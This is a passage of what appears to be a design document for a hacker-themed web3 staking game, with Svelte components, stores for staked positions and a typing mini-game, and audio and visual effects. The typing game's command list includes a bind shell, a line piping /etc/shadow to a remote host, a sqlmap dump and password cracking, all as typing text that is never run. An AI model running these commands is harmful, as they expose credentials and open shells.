  import Box from '$lib/ui/terminal/Box.svelte';

  const eventBus = getContext<EventBus>(EVENT_BUS_KEY);
  const web3 = getContext<Web3Client>(WEB3_KEY);

  const feed = createFeedStore(eventBus, () => web3.address);

  onMount(() => feed.init());
  onDestroy(() => feed.destroy());

  let visibleItems = $derived(feed.visibleItems);
</script>

<Box title="LIVE FEED">
  <div class="feed-container">
    <div class="feed-status">
      <span class="indicator online">●</span>
      <span class="label">STREAMING</span>
    </div>

    <div class="feed-list">
      {#each visibleItems as item (item.id)}
        <FeedItem {item} />
      {/each}
    </div>

    <div class="feed-footer">
      <span class="scroll-hint">▼ SCROLL FOR MORE</span>
    </div>
  </div>
</Box>

<style>
  .feed-container {
    display: flex;
    flex-direction: column;
    height: 100%;
    min-height: 300px;
  }

  .feed-status {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    padding-bottom: 0.5rem;
    border-bottom: 1px solid var(--bg-tertiary);
    margin-bottom: 0.5rem;
  }

  .indicator {
    font-size: 0.75rem;
  }

  .indicator.online {
    color: var(--green-bright);
    animation: pulse 2s infinite;
  }

  .label {
    font-size: var(--text-xs);
    color: var(--green-dim);
  }

  .feed-list {
    flex: 1;
    overflow-y: auto;
    font-size: var(--text-sm);
  }

  .feed-footer {
    padding-top: 0.5rem;
    border-top: 1px solid var(--bg-tertiary);
    text-align: center;
  }

  .scroll-hint {
    font-size: var(--text-xs);
    color: var(--green-dim);
    animation: bounce 2s infinite;
  }

  @keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.5; }
  }

  @keyframes bounce {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(3px); }
  }
</style>
```

```svelte
<!-- lib/features/feed/FeedItem.svelte -->
<script lang="ts">
  import type { FeedItem } from './store.svelte';
  import { fly, fade } from 'svelte/transition';

  interface Props {
    item: FeedItem;
  }

  let { item }: Props = $props();

  // Determine color based on event type
  let colorClass = $derived(() => {
    switch (item.type) {
      case 'TRACED': return 'color-death';
      case 'SYSTEM_RESET_WARNING':
      case 'TRACE_SCAN_WARNING': return 'color-warning';
      case 'EXTRACT':
      case 'SURVIVED': return 'color-success';
      case 'WHALE_ALERT': return 'color-whale';
      default: return 'color-default';
    }
  });
</script>

<div
  class="feed-item {colorClass()}"
  class:is-current-user={item.isCurrentUser}
  in:fly={{ y: -10, duration: 200 }}
  out:fade={{ duration: 100 }}
>
  <span class="text">{item.formattedText}</span>
  {#if item.type === 'TRACED'}
    <span class="emoji">💀</span>
  {:else if item.type === 'SURVIVED'}
    <span class="emoji">👻</span>
  {:else if item.type === 'EXTRACT'}
    <span class="emoji">💰</span>
  {:else if item.type === 'WHALE_ALERT'}
    <span class="emoji">🐋</span>
  {/if}
</div>

<style>
  .feed-item {
    padding: 0.25rem 0;
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-family: var(--font-mono);
  }

  .feed-item.is-current-user {
    background: rgba(0, 255, 0, 0.1);
    padding-left: 0.5rem;
    margin-left: -0.5rem;
    border-left: 2px solid var(--green-bright);
  }

  .color-default { color: var(--green-mid); }
  .color-death { color: var(--red); }
  .color-warning { color: var(--amber); }
  .color-success { color: var(--profit); }
  .color-whale { color: var(--cyan); }

  .text {
    flex: 1;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }

  .emoji {
    margin-left: 0.5rem;
    flex-shrink: 0;
  }

  /* Death flash animation */
  .color-death {
    animation: death-pulse 0.5s ease-out;
  }

  @keyframes death-pulse {
    0% { background: rgba(255, 0, 0, 0.3); }
    100% { background: transparent; }
  }
</style>
```

---

### 5.2 Position Module

Manages the user's staked position(s).

```typescript
// lib/features/position/store.svelte.ts

import type { EventBus } from '$lib/core/events/bus.svelte';
import type { Web3Client } from '$lib/core/web3/client.svelte';
import type { Level } from '$lib/core/events/types';
import { LEVEL_CONFIG } from '$lib/core/constants';

// ============================================================
// TYPES
// ============================================================

export interface Position {
  id: string;
  level: Level;
  stakedAmount: bigint;
  earnedYield: bigint;
  entryTimestamp: number;
  ghostStreak: number;
  nextScanTimestamp: number;
}

export interface Modifier {
  id: string;
  source: 'typing' | 'hackrun' | 'crew' | 'daily' | 'network';
  type: 'death_rate' | 'yield_multiplier';
  value: number;           // -0.15 = -15% death rate, 1.5 = 1.5x yield
  expiresAt: number | null;
  label: string;
}

// ============================================================
// STORE FACTORY
// ============================================================

export function createPositionStore(eventBus: EventBus, web3: Web3Client) {
  let position = $state<Position | null>(null);
  let modifiers = $state<Modifier[]>([]);
  let isLoading = $state(false);
  let error = $state<string | null>(null);

  // ─────────────────────────────────────────────────────────
  // DERIVED VALUES
  // ─────────────────────────────────────────────────────────

  let baseDeathRate = $derived(
    position ? LEVEL_CONFIG[position.level].baseDeathRate : 0
  );

  let effectiveDeathRate = $derived.by(() => {
    if (!position) return 0;

    let rate = baseDeathRate;

    // Apply modifiers
    for (const mod of modifiers) {
      if (mod.type === 'death_rate') {
        // Modifiers are additive multipliers: -0.15 means reduce by 15%
        rate = rate * (1 + mod.value);
      }
    }

    // Clamp to 0-1
    return Math.max(0, Math.min(1, rate));
  });

  let yieldMultiplier = $derived.by(() => {
    let multiplier = 1;

    for (const mod of modifiers) {
      if (mod.type === 'yield_multiplier') {
        multiplier *= mod.value;
      }
    }

    return multiplier;
  });

  let activeModifiers = $derived(
    modifiers.filter(m => !m.expiresAt || m.expiresAt > Date.now())
  );

  let secondsUntilNextScan = $derived(
    position ? Math.max(0, Math.floor((position.nextScanTimestamp - Date.now()) / 1000)) : null
  );

  // ─────────────────────────────────────────────────────────
  // ACTIONS
  // ─────────────────────────────────────────────────────────

  async function fetchPosition() {
    if (!web3.address) {
      position = null;
      return;
    }

    isLoading = true;
    error = null;

    try {
      const data = await web3.getPosition(web3.address);
      position = mapContractPosition(data);
    } catch (e) {
      error = e instanceof Error ? e.message : 'Failed to fetch position';
      position = null;
    } finally {
      isLoading = false;
    }
  }

  function addModifier(mod: Omit<Modifier, 'id'>) {
    const newMod: Modifier = {
      ...mod,
      id: crypto.randomUUID(),
    };

    // Remove existing modifier from same source if exists
    modifiers = [
      ...modifiers.filter(m => m.source !== mod.source),
      newMod,
    ];
  }

  function removeExpiredModifiers() {
    const now = Date.now();
    modifiers = modifiers.filter(m => !m.expiresAt || m.expiresAt > now);
  }

  // ─────────────────────────────────────────────────────────
  // EVENT SUBSCRIPTIONS
  // ─────────────────────────────────────────────────────────

  function init() {
    // User got traced - clear position
    eventBus.subscribe('TRACED', (event) => {
      if (web3.address && event.address === web3.address) {
        position = null;
        modifiers = [];
      }
    });

    // User survived - update streak
    eventBus.subscribe('SURVIVED', (event) => {
      if (web3.address && event.address === web3.address && position) {
        position.ghostStreak = event.streak;
      }
    });

    // Typing complete - add modifier
    eventBus.subscribe('USER_TYPING_COMPLETE', (event) => {
      if (position && event.accuracy >= 0.5) {
        const reduction = calculateTypingReduction(event.accuracy, event.wpm);
        addModifier({
          source: 'typing',
          type: 'death_rate',
          value: reduction,
          expiresAt: position.nextScanTimestamp,
          label: `Trace Evasion ${Math.abs(reduction * 100).toFixed(0)}%`,
        });
      }
    });

    // Timer tick - clean up expired modifiers
    eventBus.subscribe('TIMER_TICK', () => {
      removeExpiredModifiers();
    });
  }

  return {
    // State
    get position() { return position; },
    get modifiers() { return modifiers; },
    get isLoading() { return isLoading; },
    get error() { return error; },

    // Derived
    get baseDeathRate() { return baseDeathRate; },
    get effectiveDeathRate() { return effectiveDeathRate; },
    get yieldMultiplier() { return yieldMultiplier; },
    get activeModifiers() { return activeModifiers; },
    get secondsUntilNextScan() { return secondsUntilNextScan; },

    // Actions
    fetchPosition,
    addModifier,
    init,
  };
}

// ============================================================
// HELPERS
// ============================================================

function mapContractPosition(data: any): Position {
  return {
    id: data.id.toString(),
    level: data.level as Level,
    stakedAmount: data.stakedAmount,
    earnedYield: data.earnedYield,
    entryTimestamp: Number(data.entryTimestamp) * 1000,
    ghostStreak: Number(data.ghostStreak),
    nextScanTimestamp: Number(data.nextScanTimestamp) * 1000,
  };
}

function calculateTypingReduction(accuracy: number, wpm: number): number {
  // Base reduction from accuracy
  let reduction = 0;
  if (accuracy >= 0.95) reduction = -0.20;
  else if (accuracy >= 0.85) reduction = -0.15;
  else if (accuracy >= 0.70) reduction = -0.10;
  else if (accuracy >= 0.50) reduction = -0.05;

  // Speed bonus
  if (wpm >= 100 && accuracy >= 0.95) reduction -= 0.10;
  else if (wpm >= 80 && accuracy >= 0.95) reduction -= 0.05;

  return reduction;
}
```

---

### 5.3 Typing Module (Trace Evasion)

The typing mini-game reduces death probability.

```typescript
// lib/features/typing/store.svelte.ts

import type { EventBus } from '$lib/core/events/bus.svelte';
import { TYPING_CONFIG } from '$lib/core/constants';
import { COMMANDS } from './commands';

// ============================================================
// TYPES
// ============================================================

export type TypingState =
  | { status: 'idle' }
  | { status: 'countdown'; secondsLeft: number }
  | { status: 'active'; challenge: Challenge; progress: Progress }
  | { status: 'complete'; result: TypingResult };

export interface Challenge {
  command: string;
  difficulty: 'easy' | 'medium' | 'hard';
  timeLimit: number;
}

export interface Progress {
  typed: string;
  cursorPosition: number;
  errors: number;
  startTime: number;
}

export interface TypingResult {
  accuracy: number;
  wpm: number;
  command: string;
  reward: {
    type: 'death_rate_reduction';
    value: number;
    label: string;
  } | null;
  timeElapsed: number;
}

// ============================================================
// STORE FACTORY
// ============================================================

export function createTypingStore(eventBus: EventBus) {
  let state = $state<TypingState>({ status: 'idle' });

  // Countdown interval reference
  let countdownInterval: ReturnType<typeof setInterval> | null = null;
  let timeoutInterval: ReturnType<typeof setInterval> | null = null;

  // ─────────────────────────────────────────────────────────
  // DERIVED
  // ─────────────────────────────────────────────────────────

  let isActive = $derived(state.status === 'active');

  let currentWpm = $derived.by(() => {
    if (state.status !== 'active') return 0;
    const elapsed = (Date.now() - state.progress.startTime) / 1000;
    if (elapsed < 1) return 0;
    const words = state.progress.cursorPosition / 5; // Standard: 5 chars = 1 word
    return Math.round((words / elapsed) * 60);
  });

  let currentAccuracy = $derived.by(() => {
    if (state.status !== 'active') return 1;
    const totalChars = state.progress.cursorPosition + state.progress.errors;
    if (totalChars === 0) return 1;
    return state.progress.cursorPosition / totalChars;
  });

  let progressPercent = $derived.by(() => {
    if (state.status !== 'active') return 0;
    return (state.progress.cursorPosition / state.challenge.command.length) * 100;
  });

  // ─────────────────────────────────────────────────────────
  // ACTIONS
  // ─────────────────────────────────────────────────────────

  function startChallenge() {
    if (state.status !== 'idle') return;

    eventBus.emit({ type: 'USER_TYPING_START' });

    state = { status: 'countdown', secondsLeft: TYPING_CONFIG.countdownSeconds };

    countdownInterval = setInterval(() => {
      if (state.status === 'countdown') {
        if (state.secondsLeft <= 1) {
          clearInterval(countdownInterval!);
          countdownInterval = null;
          beginTyping();
        } else {
          state = { status: 'countdown', secondsLeft: state.secondsLeft - 1 };
        }
      }
    }, 1000);
  }

  function beginTyping() {
    const command = selectRandomCommand();

    state = {
      status: 'active',
      challenge: {
        command,
        difficulty: classifyDifficulty(command),
        timeLimit: TYPING_CONFIG.timeLimitSeconds,
      },
      progress: {
        typed: '',
        cursorPosition: 0,
        errors: 0,
        startTime: Date.now(),
      },
    };

    // Start timeout timer
    timeoutInterval = setInterval(() => {
      if (state.status === 'active') {
        const elapsed = (Date.now() - state.progress.startTime) / 1000;
        if (elapsed >= state.challenge.timeLimit) {
          finishChallenge(true);
        }
      }
    }, 1000);
  }

  function handleKeyPress(key: string) {
    if (state.status !== 'active') return;

    const { challenge, progress } = state;
    const expectedChar = challenge.command[progress.cursorPosition];

    if (key === expectedChar) {
      // Correct keystroke
      const newPosition = progress.cursorPosition + 1;

      eventBus.emit({ type: 'TYPING_KEYSTROKE', correct: true });

      if (newPosition >= challenge.command.length) {
        // Complete!
        state = {
          ...state,
          progress: {
            ...progress,
            typed: progress.typed + key,
            cursorPosition: newPosition,
          },
        };
        finishChallenge(false);
      } else {
        state = {
          ...state,
          progress: {
            ...progress,
            typed: progress.typed + key,
            cursorPosition: newPosition,
          },
        };
      }
    } else {
      // Error
      eventBus.emit({ type: 'TYPING_KEYSTROKE', correct: false });

      state = {
        ...state,
        progress: {
          ...progress,
          errors: progress.errors + 1,
        },
      };
    }
  }

  function finishChallenge(timedOut: boolean) {
    if (state.status !== 'active') return;

    if (timeoutInterval) {
      clearInterval(timeoutInterval);
      timeoutInterval = null;
    }

    const { challenge, progress } = state;
    const elapsed = (Date.now() - progress.startTime) / 1000;
    const wpm = ((progress.cursorPosition / 5) / (elapsed / 60));
    const accuracy = progress.cursorPosition / (progress.cursorPosition + progress.errors);

    const reward = calculateReward(accuracy, wpm, timedOut);

    const result: TypingResult = {
      accuracy,
      wpm,
      command: challenge.command,
      reward,
      timeElapsed: elapsed,
    };

    state = { status: 'complete', result };

    // Emit completion event
    eventBus.emit({
      type: 'USER_TYPING_COMPLETE',
      accuracy,
      wpm,
      command: challenge.command,
    });
  }

  function reset() {
    if (countdownInterval) {
      clearInterval(countdownInterval);
      countdownInterval = null;
    }
    if (timeoutInterval) {
      clearInterval(timeoutInterval);
      timeoutInterval = null;
    }
    state = { status: 'idle' };
  }

  return {
    get state() { return state; },
    get isActive() { return isActive; },
    get currentWpm() { return currentWpm; },
    get currentAccuracy() { return currentAccuracy; },
    get progressPercent() { return progressPercent; },

    startChallenge,
    handleKeyPress,
    reset,
  };
}

// ============================================================
// HELPERS
// ============================================================

function selectRandomCommand(): string {
  return COMMANDS[Math.floor(Math.random() * COMMANDS.length)];
}

function classifyDifficulty(command: string): 'easy' | 'medium' | 'hard' {
  if (command.length < 40) return 'easy';
  if (command.length < 70) return 'medium';
  return 'hard';
}

function calculateReward(
  accuracy: number,
  wpm: number,
  timedOut: boolean
): TypingResult['reward'] {
  if (timedOut || accuracy < 0.5) {
    return null;
  }

  let reduction = 0;
  let label = '';

  // Base reduction from accuracy
  for (const tier of TYPING_CONFIG.rewardTiers) {
    if (accuracy >= tier.minAccuracy) {
      reduction = tier.deathRateReduction;
      label = tier.label;
      break;
    }
  }

  // Speed bonus
  for (const bonus of TYPING_CONFIG.speedBonuses) {
    if (wpm >= bonus.minWpm && accuracy >= bonus.minAccuracy) {
      reduction += bonus.bonusReduction;
      label += ' + Speed Bonus';
      break;
    }
  }

  if (reduction === 0) return null;

  return {
    type: 'death_rate_reduction',
    value: reduction,
    label: `${label} (${Math.abs(reduction * 100)}% reduction)`,
  };
}
```

```typescript
// lib/features/typing/commands.ts

/**
 * Command library for typing challenges.
 * Commands look like real terminal/hacking commands.
 */

export const COMMANDS = [
  // Network commands
  'ssh -L 8080:localhost:443 ghost@proxy.darknet.io',
  'nmap -sS -sV -p- --script vuln target.subnet',
  'curl -X POST -H "Auth: Bearer token" https://api.ghost/extract',
  'nc -lvnp 4444 -e /bin/bash',
  'tcpdump -i eth0 -w capture.pcap host 192.168.1.1',

  // Encryption
  'openssl enc -aes-256-cbc -salt -in data.bin -out cipher.enc',
  'gpg --encrypt --recipient ghost@net --armor payload.dat',
  'hashcat -m 1000 -a 0 ntlm.hash wordlist.txt',

  // Exploitation
  'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD"',
  'sqlmap -u "target.io/id=1" --dump --batch --level=5',
  'nikto -h https://target.io -ssl -output scan.txt',

  // System commands
  'sudo iptables -A INPUT -s 0.0.0.0/0 -j DROP',
  'chmod 777 /dev/null && cat /etc/shadow | nc ghost.io 4444',
  'find / -perm -4000 -type f 2>/dev/null',

  // Data extraction
  'rsync -avz --progress /vault/data ghost@exit:/extracted/',
  'tar -czvf payload.tar.gz ./loot && scp payload.tar.gz ghost:/out',
  'base64 -d encoded.txt | gunzip > decoded.bin',

  // Git operations (familiar to devs)
  'git clone git@github.com:ghost/darknet.git --depth 1',
  'git push -f origin main:refs/heads/exploit',

  // Docker/container
  'docker run -it --rm -v /:/mnt alpine chroot /mnt',
  'kubectl exec -it pod/target -- /bin/sh',

  // Easy ones (for new players)
  'whoami && id && pwd',
  'ls -la /home/ghost',
  'cat /etc/passwd | grep root',
  'ping -c 4 ghostnet.io',
];
```

---

## 6. UI Component System

### 6.1 Design Tokens

```css
/* lib/ui/styles/tokens.css */

:root {
  /* ════════════════════════════════════════════════════════════
     COLORS
     ════════════════════════════════════════════════════════════ */

  /* Core Background */
  --bg-primary: #0a0a0a;       /* Near black - main background */
  --bg-secondary: #0f0f0f;     /* Slightly lighter - panels */
  --bg-tertiary: #1a1a1a;      /* Borders, dividers */
  --bg-hover: #252525;         /* Hover states */

  /* Terminal Green (Primary) */
  --green-bright: #00ff00;     /* Primary text, highlights */
  --green-mid: #00cc00;        /* Secondary text */
  --green-dim: #00aa00;        /* Tertiary text, disabled */
  --green-glow: rgba(0, 255, 0, 0.3);  /* Glow effects */

  /* Status Colors */
  --cyan: #00ffff;             /* Info, links, interactive */
  --amber: #ffaa00;            /* Warnings, caution */
  --red: #ff0000;              /* Danger, deaths, losses */
  --red-glow: rgba(255, 0, 0, 0.4);    /* Death flash */

  /* Success/Money */
  --gold: #ffd700;             /* Big wins, jackpots */
  --profit: #00ff88;           /* Gains, positive numbers */
  --loss: #ff4444;             /* Losses, negative numbers */

  /* Special Effects */
  --scan-line: rgba(0, 255, 0, 0.03);  /* CRT scan lines */
  --flicker: rgba(0, 255, 0, 0.1);     /* Text flicker */

  /* ════════════════════════════════════════════════════════════
     TYPOGRAPHY
     ════════════════════════════════════════════════════════════ */

  --font-mono: 'IBM Plex Mono', 'Fira Code', 'Consolas', monospace;

  --text-xs: 10px;     /* Timestamps, minor data */
  --text-sm: 12px;     /* Secondary info */
  --text-base: 14px;   /* Primary text */
  --text-lg: 16px;     /* Headers, important */
  --text-xl: 20px;     /* Section titles */
  --text-2xl: 28px;    /* Major numbers */
  --text-3xl: 36px;    /* Hero stats */

  --leading-tight: 1.2;
  --leading-normal: 1.5;
  --leading-relaxed: 1.75;

  /* ════════════════════════════════════════════════════════════
     SPACING
     ════════════════════════════════════════════════════════════ */

  --space-1: 0.25rem;   /* 4px */
  --space-2: 0.5rem;    /* 8px */
  --space-3: 0.75rem;   /* 12px */
  --space-4: 1rem;      /* 16px */
  --space-5: 1.25rem;   /* 20px */
  --space-6: 1.5rem;    /* 24px */
  --space-8: 2rem;      /* 32px */
  --space-10: 2.5rem;   /* 40px */

  /* ════════════════════════════════════════════════════════════
     BORDERS & RADII
     ════════════════════════════════════════════════════════════ */

  --border-width: 1px;
  --border-color: var(--bg-tertiary);
  --radius-sm: 2px;
  --radius-md: 4px;

  /* ════════════════════════════════════════════════════════════
     ANIMATION
     ════════════════════════════════════════════════════════════ */

  --duration-fast: 100ms;
  --duration-normal: 200ms;
  --duration-slow: 500ms;
  --easing-default: cubic-bezier(0.4, 0, 0.2, 1);
}
```

### 6.2 Terminal Shell

```svelte
<!-- lib/ui/terminal/Shell.svelte -->
<script lang="ts">
  import Scanlines from './Scanlines.svelte';
  import Flicker from './Flicker.svelte';
  import ScreenFlash from './ScreenFlash.svelte';
  import type { Snippet } from 'svelte';

  interface Props {
    children: Snippet;
  }

  let { children }: Props = $props();
</script>

<div class="terminal-shell">
  <Scanlines />
  <Flicker>
    <div class="terminal-content">
      {@render children()}
    </div>
  </Flicker>
  <ScreenFlash />
</div>

<style>
  .terminal-shell {
    position: relative;
    width: 100%;
    min-height: 100vh;
    background: var(--bg-primary);
    font-family: var(--font-mono);
    color: var(--green-bright);
    overflow: hidden;
  }

  .terminal-content {
    position: relative;
    z-index: 1;
    min-height: 100vh;
  }
</style>
```

```svelte
<!-- lib/ui/terminal/Scanlines.svelte -->
<div class="scanlines" aria-hidden="true"></div>

<style>
  .scanlines {
    position: fixed;
    inset: 0;
    background: repeating-linear-gradient(
      0deg,
      transparent,
      transparent 1px,
      var(--scan-line) 2px,
      var(--scan-line) 3px
    );
    pointer-events: none;
    z-index: 1000;
  }
</style>
```

```svelte
<!-- lib/ui/terminal/Flicker.svelte -->
<script lang="ts">
  import type { Snippet } from 'svelte';

  interface Props {
    children: Snippet;
    enabled?: boolean;
  }

  let { children, enabled = true }: Props = $props();
</script>

<div class="flicker-wrapper" class:enabled>
  {@render children()}
</div>

<style>
  .flicker-wrapper.enabled {
    animation: flicker 8s infinite;
  }

  @keyframes flicker {
    0%, 100% { opacity: 1; }
    92% { opacity: 1; }
    93% { opacity: 0.85; }
    94% { opacity: 1; }
    95% { opacity: 0.9; }
    96% { opacity: 1; }
  }
</style>
```

```svelte
<!-- lib/ui/terminal/ScreenFlash.svelte -->
<script lang="ts">
  import { getContext } from 'svelte';
  import { EFFECTS_KEY, type VisualManager } from '$lib/core/effects/visual.svelte';

  const visual = getContext<VisualManager>(EFFECTS_KEY);

  let flashColor = $state<string | null>(null);
  let flashOpacity = $state(0);

  // Subscribe to flash events
  $effect(() => {
    return visual.onFlash((color, duration) => {
      flashColor = color;
      flashOpacity = 0.3;

      setTimeout(() => {
        flashOpacity = 0;
      }, duration);
    });
  });
</script>

{#if flashColor}
  <div
    class="screen-flash"
    style:background-color={flashColor}
    style:opacity={flashOpacity}
  ></div>
{/if}

<style>
  .screen-flash {
    position: fixed;
    inset: 0;
    pointer-events: none;
    z-index: 999;
    transition: opacity var(--duration-fast) ease-out;
  }
</style>
```

### 6.3 Box Component (ASCII borders)

```svelte
<!-- lib/ui/terminal/Box.svelte -->
<script lang="ts">
  import type { Snippet } from 'svelte';

  interface Props {
    title?: string;
    variant?: 'single' | 'double' | 'rounded';
    padding?: boolean;
    children: Snippet;
  }

  let { title, variant = 'single', padding = true, children }: Props = $props();

  // Box drawing characters
  const chars = {
    single: {
      tl: '┌', tr: '┐', bl: '└', br: '┘',
      h: '─', v: '│', lt: '├', rt: '┤',
    },
    double: {
      tl: '╔', tr: '╗', bl: '╚', br: '╝',
      h: '═', v: '║', lt: '╠', rt: '╣',
    },
    rounded: {
      tl: '╭', tr: '╮', bl: '╰', br: '╯',
      h: '─', v: '│', lt: '├', rt: '┤',
    },
  };

  let c = $derived(chars[variant]);
</script>

<div class="box" data-variant={variant}>
  <div class="box-top">
    <span class="corner">{c.tl}</span>
    {#if title}
      <span class="h">{c.h}</span>
      <span class="title">{title}</span>
    {/if}
    <span class="line">{c.h}</span>
    <span class="corner">{c.tr}</span>
  </div>

  <div class="box-middle">
    <span class="v">{c.v}</span>
    <div class="box-content" class:with-padding={padding}>
      {@render children()}
    </div>
    <span class="v">{c.v}</span>
  </div>

  <div class="box-bottom">
    <span class="corner">{c.bl}</span>
    <span class="line">{c.h}</span>
    <span class="corner">{c.br}</span>
  </div>
</div>

<style>
  .box {
    display: flex;
    flex-direction: column;
    font-family: var(--font-mono);
    color: var(--green-mid);
  }

  .box-top, .box-bottom {
    display: flex;
    align-items: center;
  }

  .line {
    flex: 1;
    overflow: hidden;
    white-space: nowrap;
  }

  .line::before {
    content: '────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────';
  }

  .title {
    padding: 0 var(--space-2);
    color: var(--green-bright);
    font-weight: 500;
  }

  .box-middle {
    display: flex;
  }

  .v {
    flex-shrink: 0;
  }

  .box-content {
    flex: 1;
    min-width: 0;
  }

  .box-content.with-padding {
    padding: var(--space-3);
  }

  .corner, .h, .v {
    color: var(--green-dim);
  }
</style>
```

---

## 7. Audio System

### 7.1 ZzFX Sound Definitions

```typescript
// lib/audio/sounds.ts

/**
 * ZzFX sound definitions.
 * Each sound is an array of parameters for the zzfx() function.
 *
 * To test/create sounds: https://killedbyapixel.github.io/ZzFX/
 */

export const SOUNDS = {
  // ════════════════════════════════════════════════════════════
  // UI SOUNDS
  // ════════════════════════════════════════════════════════════

  click: [0.5, , 200, , 0.01, 0.01, 1, 0.5, , , , , , , , , , 0.5, 0.01],
  hover: [0.2, , 400, , 0.01, 0.01, 1, 1, , , , , , , , , , 0.3, 0.01],
  error: [0.3, , 200, 0.01, 0.01, 0.1, 2, 2, -10, , , , , , 5, , , 0.1, 0.5, 0.01],

  // ════════════════════════════════════════════════════════════
  // GAME EVENTS
  // ════════════════════════════════════════════════════════════

  jackIn: [0.5, , 150, 0.05, 0.1, 0.2, 1, 0.5, , , , , , 0.1, , 0.1, , 0.8, 0.05, 0.1],
  extract: [0.8, , 400, 0.1, 0.2, 0.3, 1, 2, , 50, 100, 0.1, 0.1, , , , , 0.7, 0.1],

  // Death/survival
  traced: [1, , 100, 0.1, 0.3, 0.5, 4, 2, -5, -50, , , 0.1, 5, , 0.5, 0.2, 0.5, 0.2],
  tracedOther: [0.2, , 100, 0.05, 0.1, 0.2, 4, 2, -5, -50, , , 0.1, 5, , 0.5, 0.2, 0.2, 0.1],
  survived: [0.7, , 500, 0.02, 0.2, 0.3, 1, 2, , , 200, 0.1, , , , , , 1, 0.1],

  // ════════════════════════════════════════════════════════════
  // TYPING
  // ════════════════════════════════════════════════════════════

  keyPress: [0.1, , 1000, , 0.01, 0, 4, 1, , , , , , , , , , 0.01],
  keyError: [0.2, , 200, , 0.01, 0.02, 4, 2, , , , , , , , , , 0.1, 0.01],
  typeComplete: [0.5, , 600, 0.05, 0.2, 0.4, 1, 2, , , 300, 0.1, , , , , , 1, 0.1],
  perfectType: [1, , 800, 0.02, 0.3, 0.5, 1, 2, 5, 50, 200, 0.1, 0.05, , , , , 1, 0.2],

  // ════════════════════════════════════════════════════════════
  // ALERTS & COUNTDOWNS
  // ════════════════════════════════════════════════════════════

  tick: [0.1, , 1500, , 0.01, , 1, 1, , , , , , , , , , 0.1, 0.01],
  urgentTick: [0.3, , 800, , 0.02, , 1, 2, , , , , , , , , , 0.2, 0.02],
  warning: [0.3, , 300, , 0.1, 0.15, 2, 1.5, -5, , , , , 3, , 0.1, , 0.5, 0.1],
  scanStart: [0.5, , 200, 0.1, 0.2, 0.3, 3, 1, , , , , , 2, , 0.2, , 0.7, 0.2],

  // ════════════════════════════════════════════════════════════
  // REWARDS
  // ════════════════════════════════════════════════════════════

  cascade: [0.5, , 300, 0.05, 0.15, 0.3, 1, 2, , , 100, 0.1, , , , , , 1, 0.1],
  jackpot: [1, 0, 200, 0.1, 0.5, 0.5, 1, 2, , , 500, 0.1, 0.05, 0.1, , 0.5, , 0.8, 0.3],
  whaleAlert: [0.6, , 100, 0.1, 0.3, 0.4, 1, 0.5, , , , , , 1, , 0.3, , 0.8, 0.2],

} as const;

export type SoundName = keyof typeof SOUNDS;
```

### 7.2 Audio Manager

```typescript
// lib/audio/manager.svelte.ts

import { zzfx } from 'zzfx';
import { SOUNDS, type SoundName } from './sounds';

export interface AudioOptions {
  volume?: number;  // 0-1, multiplied with master volume
}

export function createAudioManager() {
  let enabled = $state(true);
  let masterVolume = $state(0.7);

  // User preference persistence
  $effect(() => {
    if (typeof localStorage !== 'undefined') {
      localStorage.setItem('ghostnet:audio:enabled', String(enabled));
      localStorage.setItem('ghostnet:audio:volume', String(masterVolume));
    }
  });

  // Load preferences on init
  function init() {
    if (typeof localStorage !== 'undefined') {
      const savedEnabled = localStorage.getItem('ghostnet:audio:enabled');
      const savedVolume = localStorage.getItem('ghostnet:audio:volume');

      if (savedEnabled !== null) {
        enabled = savedEnabled === 'true';
      }
      if (savedVolume !== null) {
        masterVolume = parseFloat(savedVolume);
      }
    }
  }

  function play(sound: SoundName, options?: AudioOptions) {
    if (!enabled) return;

    const soundDef = SOUNDS[sound];
    if (!soundDef) {
      console.warn(`[Audio] Unknown sound: ${sound}`);
      return;
    }

    // Clone the sound definition
    const params = [...soundDef] as number[];

    // Apply volume (first parameter is volume)
    const effectiveVolume = masterVolume * (options?.volume ?? 1);
    params[0] = (params[0] ?? 1) * effectiveVolume;

    try {
      zzfx(...params);
    } catch (error) {
      console.error('[Audio] Failed to play sound:', error);
    }
  }

  function setEnabled(value: boolean) {
    enabled = value;
  }

  function setVolume(value: number) {
    masterVolume = Math.max(0, Math.min(1, value));
  }

  return {
    get enabled() { return enabled; },
    get masterVolume() { return masterVolume; },
    init,
    play,
    setEnabled,
    setVolume,
  };
}

export type AudioManager = ReturnType<typeof createAudioManager>;

export const AUDIO_KEY = Symbol('audio');
```

---

## 8. Visual Effects System

```typescript
// lib/core/effects/visual.svelte.ts

type FlashCallback = (color: string, duration: number) => void;
type ShakeCallback = (duration: number, intensity: number) => void;

export function createVisualManager() {
  const flashCallbacks = new Set<FlashCallback>();
  const shakeCallbacks = new Set<ShakeCallback>();

  function onFlash(callback: FlashCallback): () => void {
    flashCallbacks.add(callback);
    return () => flashCallbacks.delete(callback);
  }

  function onShake(callback: ShakeCallback): () => void {
    shakeCallbacks.add(callback);
    return () => shakeCallbacks.delete(callback);
  }

  function screenFlash(color: string, duration: number) {
    flashCallbacks.forEach(cb => cb(color, duration));
  }

  function shake(duration: number, intensity = 1) {
    shakeCallbacks.forEach(cb => cb(duration, intensity));
  }

  function feedHighlight(itemId: string, color: string) {
    // Dispatch custom event for feed items to listen to
    if (typeof window !== 'undefined') {
      window.dispatchEvent(new CustomEvent('ghostnet:feed:highlight', {
        detail: { itemId, color },
      }));
    }
  }

  return {
    onFlash,
    onShake,
    screenFlash,
    shake,
    feedHighlight,
  };
}

export type VisualManager = ReturnType<typeof createVisualManager>;

export const VISUAL_KEY = Symbol('visual');
```

### 8.1 Effects Manager (Coordinates Audio + Visual)

```typescript
// lib/core/effects/manager.svelte.ts

import type { EventBus } from '$lib/core/events/bus.svelte';
import type { AudioManager } from '$lib/audio/manager.svelte';
import type { VisualManager } from './visual.svelte';

/**
 * Coordinates audio and visual effects in response to events.
 * This is the "dopamine controller" - the single place where
 * events are mapped to user feedback.
 */
export function createEffectsManager(
  eventBus: EventBus,
  audio: AudioManager,
  visual: VisualManager,
  getCurrentUserAddress: () => `0x${string}` | null
) {
  const unsubscribers: (() => void)[] = [];

  function init() {
    // ═══════════════════════════════════════════════════════════
    // DEATH EVENTS
